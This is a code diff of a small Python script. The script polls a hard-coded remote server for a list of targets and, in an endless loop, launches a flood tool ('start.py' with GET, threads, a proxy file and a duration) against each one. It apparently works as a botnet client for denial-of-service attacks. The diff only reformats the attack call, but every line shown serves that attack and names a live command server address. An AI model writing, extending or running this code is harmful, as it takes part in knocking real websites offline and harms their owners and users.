@@ -6,6 +6,7 @@ import os
 
 host = "http://95.216.144.113:5000"
 
+
 def get_targets(host):
 
     response = requests.get(host)
@@ -19,4 +20,16 @@ while True:
     targets = get_targets(host)
 
     for target in targets:
-        subprocess.run(["python3", "start.py", "GET", target, "4", "auto", "proxy.txt", "61", "600"])
+        subprocess.run(
+            [
+                "python3",
+                "start.py",
+                "GET",
+                target,
+                "4",
+                "auto",
+                "proxy.txt",
+                "61",
+                "600",
+            ]
+        )
